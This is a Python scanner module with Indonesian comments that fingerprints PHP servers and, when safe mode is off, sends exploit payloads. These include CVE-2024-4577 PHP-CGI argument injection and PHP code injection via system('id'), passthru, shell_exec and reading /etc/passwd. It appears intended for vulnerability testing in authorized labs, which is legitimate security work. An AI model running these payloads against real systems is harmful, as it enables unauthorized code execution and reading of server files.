"""PHP indicator / fingerprint + active PHP payload injection — authorized CTF labs only.

Cara kerja:

  1. Sidik jari PHP dari header dan string error default (passive, aman).
  2. Tandai parameter yang direfleksikan tanpa escaping di body — candidate
     titik injeksi, TIDAK mengirim kode payload.
  3. Tandai indikasi misconfig PHP umum (phpinfo() terbuka, display_errors
     bocor jalur) pada endpoint yang sudah ditemukan.

Aktif (hanya dengan --no-safe / config._exploit_allowed):

  4. CVE-2024-4577: PHP-CGI argument injection — cek apakah PHP-CGI terima
     argumen -d (allow_url_include / auto_prepend_file) yang bisa bernas ke
     RCE.
  5. Generic PHP code injection — uji payload umum (system, eval, passthru,
     shell_exec, file_get_contents) terhadap parameter yang direfleksikan.

Seluruh alur pasif tidak mengirim payload yang bisa mengeksekusi kode atau
membuka file. Temukan aktif dilaporkan sebagai indikasi eksploitasi untuk
diverifikasi manual oleh manusia, hanya di lab CTF yang diotorisasi.
"""

from __future__ import annotations

import re
import uuid
from typing import List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from .base import BaseModule

# Marker inert dan non-ekseskusi — hanya untuk cek apakah nilai parameter
# kembali tanpa escaping (candidate injection point, bukan bukaan celah).
_MARKER_PREFIX = "wscfp"

PHP_VERSION_RE = re.compile(r"PHP/(\d+\.\d+(?:\.\d+)?)", re.IGNORECASE)
PHP_ERROR_INDICATORS = [
    re.compile(r"Fatal error:.*? in .*?\.php on line \d+", re.IGNORECASE | re.DOTALL),
    re.compile(r"Warning:.*?\.php on line \d+", re.IGNORECASE | re.DOTALL),
    re.compile(r"Parse error:.*?\.php", re.IGNORECASE | re.DOTALL),
    re.compile(r"Deprecated:.*?\.php on line \d+", re.IGNORECASE | re.DOTALL),
]
PHPINFO_INDICATORS = ["phpinfo()", "PHP Version", "PHP Credits", "Configuration File (php.ini) Path"]

# CVE-2024-4577 — PHP CGI Argument Injection (Windows). Tiap entri:
# (nama, injeksi path, body POST, penanda bukti).
# Injeksi path menambahkan argumen ini PHP sebagai argumen CGI.
# Sumber: riset PHP Oktober 2024 (~/agentic_ai/riset_php_october_2024.md).
CVE_2024_4577_PAYLOADS: List[Tuple[str, str, Optional[str], str]] = [
    (
        "cve-2024-4577_allow_url_include",
        "?%add+allow_url_include%3d1+auto_prepend_file%3dphp://input",
        "<?php echo 'ProbeX_CGI_VULN'; ?>",
        "ProbeX_CGI_VULN",
    ),
    (
        "cve-2024-4577_disable_functions_bypass",
        "?%add+disable_functions%3d+safe_mode%3dOff",
        "<?php echo 'ProbeX_CGI_VULN'; ?>",
        "ProbeX_CGI_VULN",
    ),
    (
        "cve-2024-4577_system_via_putenv",
        "?%add+allow_url_include%3d1+auto_prepend_file%3dphp://input",
        "<?php system('id'); ?>",
        "uid=",
    ),
]

# Payload injeksi kode PHP umum untuk parameter direfleksikan.
# Tiap entri: (nama, payload, penanda bukti).
PHP_CODE_PAYLOADS: List[Tuple[str, str, str]] = [
    ("php_eval", "<?php echo 'ProbeX_PHP_VULN'; ?>", "ProbeX_PHP_VULN"),
    ("php_system_id", "<?php system('id'); ?>", "uid="),
    ("php_file_get_contents", "<?php echo file_get_contents('/etc/passwd'); ?>", "root:x:"),
    ("php_passthru", "<?php passthru('id'); ?>", "uid="),
    ("php_shell_exec", "<?php echo shell_exec('id'); ?>", "uid="),
]


class PHPExploitModule(BaseModule):
    name = "PHP Indicator / Fingerprint Detection"

    def run(self) -> None:
        self.log("Scan sidik jari PHP + indikasi parameter direfleksikan (tanpa mengirim kode payload)")

        endpoints: List[str] = []
        if hasattr(self.reporter, "endpoints"):
            endpoints = list(self.reporter.endpoints)
        if self.config.base_url not in endpoints:
            endpoints.append(self.config.base_url)
        seen = set()
        endpoints = [e for e in endpoints if not (e in seen or seen.add(e))]

        version_reported = False

        for url in endpoints:
            if not self.config.can_request() or self.rm.stopped_by_429:
                break
            if not url.startswith(("http://", "https://")):
                continue

            resp = self.rm.get(url, allow_redirects=False)
            if resp is None:
                continue
            body = resp.text or ""

            # 1) Versi / teknologi dari header (read-only)
            if not version_reported:
                server_hdr = resp.headers.get("Server", "") + " " + resp.headers.get("X-Powered-By", "")
                m = PHP_VERSION_RE.search(server_hdr)
                if m:
                    self.reporter.add_finding(
                        "PHP version disclosed in headers",
                        severity="low",
                        detail=f"Detected PHP {m.group(1)} via Server/X-Powered-By header",
                        evidence=server_hdr.strip()[:200],
                        url=url,
                        method="GET",
                        parameter="",
                        evidence_snippet=server_hdr.strip()[:200],
                    )
                    self.log(f"Fingerprint versi PHP: {m.group(1)}")
                    version_reported = True

            # 2) Output error verbose yang bocor stack / jalur
            for pattern in PHP_ERROR_INDICATORS:
                hit = pattern.search(body)
                if hit:
                    self.reporter.add_finding(
                        "PHP verbose error output exposed",
                        severity="medium",
                        detail=f"Error disclosure at {url} (display_errors likely on)",
                        evidence=hit.group(0)[:300],
                        url=url,
                        method="GET",
                        parameter="",
                        evidence_snippet=hit.group(0)[:300],
                    )
                    self.log(f"Error PHP verbose di {url}")
                    break

            # 3) Halaman phpinfo()-model yang terbuka
            if any(ind in body for ind in PHPINFO_INDICATORS):
                self.reporter.add_finding(
                    "Possible phpinfo()/config exposure",
                    severity="high",
                    detail=f"{url} mengandung output mirip phpinfo(); bisa bocor konfigurasi/jalur server",
                    evidence="",
                    url=url,
                    method="GET",
                    parameter="",
                    evidence_snippet="",
                )
                self.log(f"phpinfo()-model terbuka di {url}")

            # 4) Indikasi parameter direfleksikan (candidate titik injeksi).
            #    Hanya mengirim marker alfanumerik inert, tidak ada sintaks
            #    ekseskusi, dan hanya cek apakah kembali tanpa escaping.
            result = self._check_reflection(url)
            if result:
                test_url = urlunparse(urlparse(url)._replace(
                    query=urlencode([(k, "x" if k == result["param"] else v)
                                     for k, v in parse_qsl(urlparse(url).query, keep_blank_values=True)])
                ))
                self.reporter.add_finding(
                    f"Unescaped parameter reflection: {result['param']}",
                    severity="low",
                    detail=(
                        f"Parameter '{result['param']}' pada {url} direfleksikan utuh "
                        "dalam response. Candidate titik injeksi untuk follow-up manual "
                        "(diotorisasi), bukan konfirmasi celah."
                    ),
                    evidence=result["evidence"][:300],
                    url=test_url,
                    method="GET",
                    parameter=result["param"],
                    evidence_snippet=result["evidence"][:300],
                )
                self.log(f"Kandidat parameter direfleksikan: {result['param']} di {url}")

        # --- Aktif (hanya --no-safe / _exploit_allowed) ---
        if self.config.safe_mode and not getattr(self.config, "_exploit_allowed", False):
            self.log("Lewati injeksi PHP aktif: butuh --no-safe")
            self.log("Scan indikator PHP selesai (pasif saja)")
            return

        self.log("Injeksi payload PHP aktif (--no-safe diaktifkan)")

        # 5) CVE-2024-4577 — uji injeksi berbasis path.
        for url in endpoints:
            if not self.config.can_request() or self.rm.stopped_by_429:
                break
            if not url.startswith(("http://", "https://")):
                continue
            self._test_cve_2024_4577(url)

        # 6) Injeksi kode PHP umum — uji parameter direfleksikan.
        for url in endpoints:
            if not self.config.can_request() or self.rm.stopped_by_429:
                break
            if not url.startswith(("http://", "https://")):
                continue
            self._test_php_code_injection(url)

        self.log("Scan PHP selesai (pasif + aktif)")

    def _check_reflection(self, url: str) -> Optional[dict]:
        parsed = urlparse(url)
        params = parse_qsl(parsed.query, keep_blank_values=True)
        if not params:
            return None

        marker = f"{_MARKER_PREFIX}{uuid.uuid4().hex[:8]}"

        for key, _ in params:
            if not self.config.can_request():
                return None
            new_params = [(k, marker if k == key else v) for k, v in params]
            test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
            resp = self.rm.get(test_url, allow_redirects=False)
            if resp is None:
                continue
            body = resp.text or ""
            if marker in body:
                return {
                    "param": key,
                    "evidence": f"{test_url} | marker '{marker}' direfleksikan tanpa escaping",
                }
        return None

    def _test_cve_2024_4577(self, url: str) -> None:
        """Uji CVE-2024-4577 PHP CGI argument injection pada satu URL.

        Menambahkan injeksi argumen CGI ke path URL dan mengirim body POST
        berisi kode PHP. Jika penanda muncul dalam response, target kemungkinan
        rentan terhadap RCE via PHP-CGI.
        """
        parsed = urlparse(url)
        base_path = parsed.path or "/"
        # Pertahankan query string asli (boleh ada parameter lain) agar
        # injeksi path tidak menghapusnya.
        original_query = parsed.query

        for name, path_inject, post_body, marker in CVE_2024_4577_PAYLOADS:
            if not self.config.can_request():
                return
            inject_url = urlunparse(
                parsed._replace(path=base_path + path_inject, query=original_query)
            )
            try:
                # Coba beberapa varian penyerapan body (POST form, JSON, multipart)
                # agar deteksi tidak bergantung pada satu content-type saja.
                variants = [
                    {
                        "data": post_body,
                        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                    },
                    {
                        "json": None,
                        "headers": {"Content-Type": "application/json"},
                    },
                    {
                        "files": {"file": ("payload.php", post_body, "application/x-php")},
                        "headers": {},
                    },
                ]
                for variant in variants:
                    if not self.config.can_request():
                        return
                    if "json" in variant:
                        variant_body = post_body
                    else:
                        variant_body = variant.get("data")
                    resp = self.rm.request(
                        "POST",
                        inject_url,
                        data=variant.get("data"),
                        json=variant_body if "json" in variant else None,
                        files=variant.get("files"),
                        allow_redirects=False,
                        headers=variant["headers"],
                    )
                    if resp is None:
                        continue
                    body = resp.text or ""
                    if marker in body:
                        self.reporter.add_finding(
                            f"CVE-2024-4577 PHP CGI argument injection: {name}",
                            severity="critical",
                            detail=(
                                f"Target terima argumen injeksi PHP-CGI di {inject_url}. "
                                f"Payload '{name}' dieksekusi dan penanda '{marker}' direfleksikan. "
                                "Kemungkinan besar rentan terhadap remote code execution."
                            ),
                            evidence=f"{inject_url} | snippet body={body[:300]}",
                            url=inject_url,
                            method="POST",
                            parameter="",
                            evidence_snippet=f"{inject_url} | snippet body={body[:300]}",
                        )
                        self.log(f"[!] CVE-2024-4577 rentan: {name} di {inject_url}")
                        return  # Satu hit terkonfirmasi cukup per URL
            except Exception:
                continue

    def _test_php_code_injection(self, url: str) -> None:
        """Uji injeksi kode PHP umum terhadap parameter direfleksikan.

        Payload dicoba melalui GET query param, POST form body, JSON body,
        dan multipart agar deteksi tidak tergantung pada satu transport.
        """
        parsed = urlparse(url)
        params = parse_qsl(parsed.query, keep_blank_values=True)
        if not params:
            return

        for key, _ in params:
            for name, payload, marker in PHP_CODE_PAYLOADS:
                if not self.config.can_request():
                    return
                # --- GET query param ---
                get_params = [(k, payload if k == key else v) for k, v in params]
                test_url = urlunparse(parsed._replace(query=urlencode(get_params)))
                resp = self.rm.get(test_url, allow_redirects=False)
                if resp is not None and marker in (resp.text or ""):
                    self._report_php_injection(name, test_url, marker, resp, method="GET", parameter=key)
                    return
                if not self.config.can_request():
                    return
                # --- POST form body ---
                post_data = {k: (payload if k == key else v) for k, v in params}
                resp = self.rm.request(
                    "POST", test_url, data=post_data, allow_redirects=False,
                )
                if resp is not None and marker in (resp.text or ""):
                    self._report_php_injection(name, test_url, marker, resp, method="POST", parameter=key)
                    return
                if not self.config.can_request():
                    return
                # --- POST JSON body ---
                json_body = {k: (payload if k == key else v) for k, v in params}
                resp = self.rm.request(
                    "POST", test_url, json=json_body,
                    headers={"Content-Type": "application/json"},
                    allow_redirects=False,
                )
                if resp is not None and marker in (resp.text or ""):
                    self._report_php_injection(name, test_url, marker, resp, method="POST", parameter=key)
                    return
                if not self.config.can_request():
                    return
                # --- POST multipart ---
                files = {key: ("payload.php", payload, "application/x-php")}
                multipart_data = {k: v for k, v in params if k != key}
                resp = self.rm.request(
                    "POST", test_url, files=files, data=multipart_data,
                    allow_redirects=False,
                )
                if resp is not None and marker in (resp.text or ""):
                    self._report_php_injection(name, test_url, marker, resp, method="POST", parameter=key)
                    return

    def _report_php_injection(self, name: str, test_url: str, marker: str, resp,
                              method: str = "GET", parameter: str = "") -> None:
        """Laporkan temuan injeksi kode PHP yang terkonfirmasi."""
        body = resp.text or ""
        self.reporter.add_finding(
            f"PHP code injection: {name}",
            severity="critical",
            detail=(
                f"Payload PHP ({name}) direfleksikan dan dieksekusi di {test_url}. "
                "Kemungkinan RCE via injeksi PHP."
            ),
            evidence=f"{test_url} | penanda={marker} | snippet body={body[:300]}",
            url=test_url,
            method=method,
            parameter=parameter,
            evidence_snippet=f"{test_url} | penanda={marker} | snippet body={body[:300]}",
        )
        self.log(f"[!] Injeksi kode PHP: {name} di {test_url}")
